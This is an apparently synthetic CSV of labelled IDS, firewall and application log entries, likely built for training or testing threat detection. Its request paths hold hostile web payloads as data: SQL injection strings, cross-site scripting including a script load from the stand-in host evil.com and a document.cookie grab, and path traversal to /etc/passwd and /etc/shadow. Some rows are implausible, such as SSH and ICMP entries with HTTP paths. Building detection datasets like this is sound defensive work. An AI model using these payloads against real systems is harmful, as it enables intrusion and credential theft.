timestamp,source_ip,dest_ip,protocol,action,threat_label,log_type,bytes_transferred,user_agent,request_path
2024-05-02T16:21:46,192.168.1.132,192.168.1.152,HTTP,allowed,malicious,ids,1131,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-02T13:38:56,192.168.1.44,192.168.1.206,TCP,allowed,malicious,ids,280,curl/7.85,/login?user=admin'--
2024-05-03T09:24:56,192.168.1.22,192.168.1.227,HTTP,blocked,malicious,ids,422,python-requests/2.28.0,/search?q=1 OR 1=1
2024-05-01T21:53:22,192.168.1.173,192.168.1.60,HTTP,blocked,suspicious,ids,1368,sqlmap/1.7,/phpinfo.php
2024-05-02T20:48:08,192.168.1.179,192.168.1.246,HTTP,blocked,suspicious,ids,488,sqlmap/1.7,/admin/
2024-05-01T14:58:27,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,664,python-requests/2.28.0,/admin/login.php
2024-05-02T00:58:20,192.168.1.4,192.168.1.127,HTTP,allowed,benign,ids,27641,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.html
2024-05-01T14:41:03,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,425,python-requests/2.28.0,/admin/login.php
2024-05-01T21:10:49,192.168.1.67,192.168.1.57,HTTP,allowed,malicious,ids,866,curl/7.85,/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-02T10:38:25,192.168.1.243,192.168.1.22,HTTP,allowed,benign,ids,30994,curl/7.85,/index.php
2024-05-01T18:39:03,192.168.1.68,192.168.1.183,HTTP,allowed,malicious,ids,1032,python-requests/2.28.0,/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-02T18:07:59,192.168.1.130,192.168.1.116,TCP,blocked,malicious,ids,363,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api?filter=SELECT username FROM users
2024-05-03T01:40:10,192.168.1.182,192.168.1.145,TCP,allowed,malicious,ids,134,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=1' AND '1'='1
2024-05-01T14:56:54,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,416,python-requests/2.28.0,/admin/login.php
2024-05-02T10:22:34,192.168.1.24,192.168.1.12,HTTP,allowed,malicious,ids,862,curl/7.85,/download?file=../../../etc/shadow
2024-05-02T03:14:28,192.168.1.125,192.168.1.55,HTTP,allowed,suspicious,ids,797,sqlmap/1.7,/admin/
2024-05-02T09:32:38,192.168.1.83,192.168.1.219,TCP,blocked,suspicious,ids,671,dirb/2.22,/.git/
2024-05-01T21:57:24,192.168.1.64,192.168.1.50,TCP,allowed,suspicious,ids,387,sqlmap/1.7,/.git/
2024-05-02T05:56:02,192.168.1.195,192.168.1.125,HTTP,allowed,benign,firewall,17424,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-01T21:41:06,192.168.1.111,192.168.1.246,HTTP,allowed,suspicious,ids,1548,gobuster/3.1,/login
2024-05-01T14:24:18,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,2443884,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-01T18:03:04,192.168.1.117,192.168.1.34,TCP,allowed,malicious,ids,1254,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?pass=admin' OR 'x'='x
2024-05-01T16:40:19,192.168.1.117,192.168.1.23,HTTP,allowed,suspicious,ids,762,dirb/2.22,/wp-admin/
2024-05-01T14:46:21,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,257,python-requests/2.28.0,/admin/login.php
2024-05-03T01:49:16,192.168.1.243,192.168.1.194,UDP,allowed,benign,ids,698,curl/7.85,/admin/login.php
2024-05-01T14:57:21,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,323,python-requests/2.28.0,/admin/login.php
2024-05-03T07:47:30,192.168.1.36,192.168.1.136,TCP,allowed,malicious,ids,743,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?id=1; DROP TABLE users--
2024-05-02T15:42:50,192.168.1.172,192.168.1.102,UDP,allowed,benign,application,13227,python-requests/2.28.0,/
2024-05-01T14:46:12,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,770,python-requests/2.28.0,/admin/login.php
2024-05-03T00:06:10,192.168.1.247,192.168.1.20,TCP,blocked,suspicious,ids,1861,Nmap Scripting Engine,/robots.txt
2024-05-01T17:09:27,192.168.1.187,192.168.1.201,TCP,allowed,malicious,ids,1417,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1 OR 1=1
2024-05-01T14:57:21,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,293,python-requests/2.28.0,/admin/login.php
2024-05-01T14:46:42,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,416,python-requests/2.28.0,/admin/login.php
2024-05-02T02:53:33,192.168.1.226,192.168.1.106,TCP,blocked,suspicious,ids,1608,nikto/2.1.6,/admin/
2024-05-03T00:39:02,192.168.1.147,192.168.1.191,TCP,allowed,benign,application,26261,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-02T12:43:33,192.168.1.34,192.168.1.27,UDP,allowed,benign,application,20161,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login
2024-05-01T14:58:33,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,469,python-requests/2.28.0,/admin/login.php
2024-05-01T22:13:23,192.168.1.61,192.168.1.163,UDP,allowed,benign,ids,1087,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/admin/login.php
2024-05-02T14:02:46,192.168.1.185,192.168.1.30,UDP,allowed,benign,application,31479,curl/7.85,/dashboard
2024-05-01T14:40:06,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,481,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:48,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,505,python-requests/2.28.0,/admin/login.php
2024-05-03T05:34:27,192.168.1.229,192.168.1.139,UDP,allowed,benign,application,9840,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ftp
2024-05-01T14:40:39,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,423,python-requests/2.28.0,/admin/login.php
2024-05-01T17:40:43,192.168.1.173,192.168.1.188,UDP,allowed,benign,ids,33177,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
2024-05-01T14:46:27,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,232,python-requests/2.28.0,/admin/login.php
2024-05-02T07:31:29,192.168.1.53,192.168.1.18,HTTP,blocked,malicious,ids,1014,python-requests/2.28.0,/page?name=<script>alert(1)</script>
2024-05-02T10:16:58,192.168.1.119,192.168.1.64,TCP,allowed,suspicious,ids,1754,nikto/2.1.6,/phpinfo.php
2024-05-02T05:52:01,192.168.1.149,192.168.1.19,HTTP,allowed,malicious,ids,805,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?pass=admin' OR 'x'='x
2024-05-02T02:03:32,192.168.1.59,192.168.1.20,ICMP,allowed,benign,application,18503,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.php
2024-05-01T19:56:26,192.168.1.70,192.168.1.114,TCP,allowed,malicious,ids,1343,curl/7.85,/api?filter=SELECT username FROM users
2024-05-01T14:24:00,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,1728707,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-01T14:57:03,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,519,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:34,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,4971684,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-01T14:24:14,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,2562238,curl/7.85,/upload
2024-05-02T23:42:59,192.168.1.235,192.168.1.15,TCP,allowed,malicious,ids,1241,python-requests/2.28.0,/comment?text=</script><script>document.cookie
2024-05-02T09:59:13,192.168.1.3,192.168.1.145,TCP,allowed,suspicious,ids,1805,gobuster/3.1,/admin/
2024-05-01T14:45:36,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,579,python-requests/2.28.0,/admin/login.php
2024-05-01T14:41:06,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,659,python-requests/2.28.0,/admin/login.php
2024-05-01T14:56:18,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,287,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:39,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,382,python-requests/2.28.0,/admin/login.php
2024-05-01T15:43:23,192.168.1.169,192.168.1.50,HTTP,allowed,suspicious,ids,670,nikto/2.1.6,/wp-admin/
2024-05-02T11:23:29,192.168.1.83,192.168.1.27,HTTP,allowed,malicious,ids,1453,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/items?category=1 AND 1=1
2024-05-02T04:43:56,192.168.1.177,192.168.1.233,HTTP,allowed,malicious,ids,425,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=<script src='http://evil.com/x.js'>
2024-05-02T01:06:53,192.168.1.176,192.168.1.237,TCP,blocked,malicious,ids,286,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-03T03:00:57,192.168.1.144,192.168.1.53,UDP,allowed,benign,ids,23912,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
2024-05-03T12:27:34,192.168.1.130,192.168.1.98,HTTP,allowed,benign,firewall,23960,python-requests/2.28.0,/dashboard
2024-05-02T01:19:09,192.168.1.70,192.168.1.73,TCP,allowed,suspicious,ids,516,dirb/2.22,/robots.txt
2024-05-02T05:22:42,192.168.1.188,192.168.1.6,ICMP,allowed,benign,application,11174,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-01T22:21:56,192.168.1.196,192.168.1.72,HTTP,allowed,malicious,ids,1248,python-requests/2.28.0,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-01T14:48:42,192.168.1.142,192.168.1.224,ICMP,allowed,benign,firewall,8176,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/
2024-05-02T12:17:50,192.168.1.170,192.168.1.149,HTTP,allowed,suspicious,ids,1233,nikto/2.1.6,/phpinfo.php
2024-05-01T14:41:00,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,629,python-requests/2.28.0,/admin/login.php
2024-05-01T16:20:49,192.168.1.116,192.168.1.68,TCP,blocked,malicious,ids,999,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/profile?bio=<img src=x onerror=alert(1)>
2024-05-02T08:16:31,192.168.1.144,192.168.1.220,ICMP,allowed,benign,firewall,26209,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-02T15:37:31,192.168.1.91,192.168.1.161,SSH,allowed,benign,firewall,32950,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/
2024-05-01T14:41:24,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,484,python-requests/2.28.0,/admin/login.php
2024-05-03T08:23:51,192.168.1.103,192.168.1.137,TCP,blocked,malicious,ids,836,python-requests/2.28.0,/search?q=<script src='http://evil.com/x.js'>
2024-05-01T14:57:30,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,265,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:09,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,473,python-requests/2.28.0,/admin/login.php
2024-05-02T13:43:49,192.168.1.97,192.168.1.72,TCP,allowed,malicious,ids,333,python-requests/2.28.0,/profile?bio=<img src=x onerror=alert(1)>
2024-05-01T14:40:27,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,632,python-requests/2.28.0,/admin/login.php
2024-05-02T22:38:06,192.168.1.203,192.168.1.5,TCP,allowed,suspicious,ids,553,gobuster/3.1,/.git/
2024-05-01T21:16:20,192.168.1.185,192.168.1.70,HTTP,allowed,benign,application,28425,curl/7.85,/dashboard
2024-05-02T14:45:20,192.168.1.243,192.168.1.30,ICMP,allowed,benign,ids,16493,curl/7.85,/ftp
2024-05-03T10:14:36,192.168.1.73,192.168.1.200,HTTP,allowed,malicious,ids,520,python-requests/2.28.0,/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-03T13:40:40,192.168.1.242,192.168.1.3,TCP,allowed,benign,ids,17880,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-01T15:11:08,192.168.1.32,192.168.1.238,HTTP,allowed,malicious,ids,1034,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/update?field=vbscript:msgbox(1)
2024-05-02T20:08:44,192.168.1.43,192.168.1.48,TCP,allowed,benign,firewall,15476,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-01T14:58:24,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,361,python-requests/2.28.0,/admin/login.php
2024-05-02T17:10:31,192.168.1.204,192.168.1.253,TCP,allowed,malicious,ids,395,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-01T14:45:30,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,573,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:51,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,272,python-requests/2.28.0,/admin/login.php
2024-05-02T09:18:40,192.168.1.34,192.168.1.239,HTTP,blocked,suspicious,ids,1900,dirb/2.22,/login
2024-05-01T14:58:21,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,645,python-requests/2.28.0,/admin/login.php
2024-05-01T17:23:09,192.168.1.238,192.168.1.163,ICMP,allowed,benign,firewall,29624,curl/7.85,/index.php
2024-05-01T17:06:32,192.168.1.242,192.168.1.119,HTTP,blocked,malicious,ids,1275,curl/7.85,/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd
2024-05-03T12:31:47,192.168.1.8,192.168.1.128,TCP,allowed,malicious,ids,1089,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/api?filter=SELECT username FROM users
2024-05-02T17:45:37,192.168.1.99,192.168.1.254,TCP,allowed,suspicious,ids,175,gobuster/3.1,/login
2024-05-02T22:15:58,192.168.1.199,192.168.1.212,TCP,allowed,malicious,ids,953,python-requests/2.28.0,/download?file=../../../etc/shadow
2024-05-02T21:31:54,192.168.1.81,192.168.1.5,UDP,allowed,benign,application,7853,python-requests/2.28.0,/
2024-05-01T14:24:04,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,1138710,curl/7.85,/upload
2024-05-02T12:27:31,192.168.1.67,192.168.1.93,TCP,allowed,malicious,ids,301,curl/7.85,"/input?val=data:text/html,<script>alert(1)</script>"
2024-05-02T15:34:10,192.168.1.165,192.168.1.131,HTTP,allowed,suspicious,ids,156,sqlmap/1.7,/wp-admin/
2024-05-02T00:39:45,192.168.1.215,192.168.1.16,SSH,allowed,benign,firewall,2217,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.html
2024-05-02T21:52:13,192.168.1.12,192.168.1.106,TCP,blocked,malicious,ids,1009,python-requests/2.28.0,/items?category=1 AND 1=1
2024-05-01T23:02:28,192.168.1.133,192.168.1.40,TCP,blocked,malicious,ids,431,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?id=1; DROP TABLE users--
2024-05-03T08:50:41,192.168.1.140,192.168.1.190,ICMP,allowed,benign,firewall,12781,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.html
2024-05-01T21:34:09,192.168.1.53,192.168.1.136,HTTP,allowed,malicious,ids,1107,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/img/../../../../etc/hosts
2024-05-02T07:19:49,192.168.1.89,192.168.1.252,TCP,blocked,malicious,ids,1402,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-02T22:55:41,192.168.1.143,192.168.1.192,HTTP,blocked,malicious,ids,1046,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/img/../../../../etc/hosts
2024-05-01T14:46:00,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,367,python-requests/2.28.0,/admin/login.php
2024-05-01T18:04:16,192.168.1.43,192.168.1.67,HTTP,allowed,benign,application,26671,python-requests/2.28.0,/
2024-05-03T13:43:48,192.168.1.61,192.168.1.26,SSH,allowed,benign,application,4674,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ssh
2024-05-03T05:43:43,192.168.1.10,192.168.1.214,HTTP,blocked,suspicious,ids,980,nikto/2.1.6,/login
2024-05-03T06:53:36,192.168.1.144,192.168.1.85,HTTP,allowed,malicious,ids,824,curl/7.85,/search?q=1 OR 1=1
2024-05-01T17:05:03,192.168.1.187,192.168.1.223,TCP,allowed,malicious,ids,662,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-01T14:40:24,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,289,python-requests/2.28.0,/admin/login.php
2024-05-03T07:10:56,192.168.1.146,192.168.1.94,SSH,allowed,benign,ids,11151,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-02T00:58:45,192.168.1.36,192.168.1.52,SSH,allowed,benign,ids,30087,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ssh
2024-05-01T14:45:54,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,746,python-requests/2.28.0,/admin/login.php
2024-05-01T14:45:42,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,414,python-requests/2.28.0,/admin/login.php
2024-05-01T14:59:21,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,219,python-requests/2.28.0,/admin/login.php
2024-05-01T14:46:24,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,434,python-requests/2.28.0,/admin/login.php
2024-05-01T14:24:38,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,2058602,python-requests/2.28.0,/upload
2024-05-03T11:55:48,192.168.1.206,192.168.1.140,HTTP,allowed,malicious,ids,835,curl/7.85,/view?doc=..%252f..%252fetc%252fpasswd
2024-05-02T07:43:03,192.168.1.112,192.168.1.151,TCP,blocked,malicious,ids,910,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=1' AND '1'='1
2024-05-03T03:31:14,192.168.1.203,192.168.1.41,HTTP,allowed,malicious,ids,1137,curl/7.85,/img/../../../../etc/hosts
2024-05-01T14:47:18,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,751,python-requests/2.28.0,/admin/login.php
2024-05-01T14:24:40,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,3989450,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-01T18:34:24,192.168.1.29,192.168.1.215,TCP,blocked,malicious,ids,1394,python-requests/2.28.0,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-02T14:44:42,192.168.1.90,192.168.1.2,HTTP,blocked,malicious,ids,1259,curl/7.85,/login?user=admin'--
2024-05-01T14:57:24,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,248,python-requests/2.28.0,/admin/login.php
2024-05-02T17:01:15,192.168.1.24,192.168.1.138,HTTP,blocked,malicious,ids,649,curl/7.85,/page?name=<script>alert(1)</script>
2024-05-03T03:37:20,192.168.1.65,192.168.1.97,HTTP,allowed,benign,application,26697,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-01T15:47:56,192.168.1.234,192.168.1.133,SSH,allowed,benign,application,33440,curl/7.85,/index.html
2024-05-01T20:23:33,192.168.1.208,192.168.1.175,TCP,allowed,malicious,ids,232,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-01T14:58:15,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,443,python-requests/2.28.0,/admin/login.php
2024-05-02T02:55:11,192.168.1.252,192.168.1.175,TCP,allowed,benign,firewall,11489,python-requests/2.28.0,/login
2024-05-01T20:52:06,192.168.1.25,192.168.1.169,HTTP,allowed,suspicious,ids,967,nikto/2.1.6,/.git/
2024-05-01T22:22:48,192.168.1.6,192.168.1.218,TCP,blocked,malicious,ids,1486,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/profile?bio=<img src=x onerror=alert(1)>
2024-05-01T15:24:44,192.168.1.39,192.168.1.13,ICMP,allowed,benign,firewall,12285,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/admin/login.php
2024-05-01T15:06:59,192.168.1.55,192.168.1.240,HTTP,blocked,malicious,ids,1080,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/profile?bio=<img src=x onerror=alert(1)>
2024-05-02T15:27:21,192.168.1.239,192.168.1.7,TCP,blocked,malicious,ids,911,python-requests/2.28.0,/search?q=1' AND '1'='1
2024-05-01T14:00:02,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,2251898,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-02T12:46:14,192.168.1.110,192.168.1.190,TCP,allowed,benign,firewall,3107,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-02T07:49:15,192.168.1.190,192.168.1.12,TCP,allowed,malicious,ids,579,python-requests/2.28.0,/profile?bio=<img src=x onerror=alert(1)>
2024-05-03T06:34:56,192.168.1.94,192.168.1.24,HTTP,blocked,suspicious,ids,641,gobuster/3.1,/phpinfo.php
2024-05-03T07:42:14,192.168.1.153,192.168.1.101,ICMP,allowed,benign,application,5678,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-02T15:44:37,192.168.1.56,192.168.1.229,ICMP,allowed,benign,ids,12078,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.html
2024-05-01T17:51:50,192.168.1.172,192.168.1.15,HTTP,allowed,benign,ids,10647,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-02T04:31:29,192.168.1.227,192.168.1.11,TCP,allowed,malicious,ids,1155,curl/7.85,/login?pass=admin' OR 'x'='x
2024-05-01T14:56:00,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,514,python-requests/2.28.0,/admin/login.php
2024-05-02T22:41:23,192.168.1.60,192.168.1.137,HTTP,allowed,malicious,ids,1060,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-02T02:11:21,192.168.1.249,192.168.1.245,ICMP,allowed,benign,application,580,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
2024-05-01T23:11:28,192.168.1.122,192.168.1.172,TCP,blocked,suspicious,ids,1052,nikto/2.1.6,/robots.txt
2024-05-03T06:49:05,192.168.1.112,192.168.1.102,HTTP,allowed,benign,firewall,25640,curl/7.85,/dashboard
2024-05-03T05:32:32,192.168.1.145,192.168.1.169,HTTP,blocked,malicious,ids,744,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/profile?bio=<img src=x onerror=alert(1)>
2024-05-03T02:29:26,192.168.1.131,192.168.1.24,UDP,allowed,benign,ids,33010,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
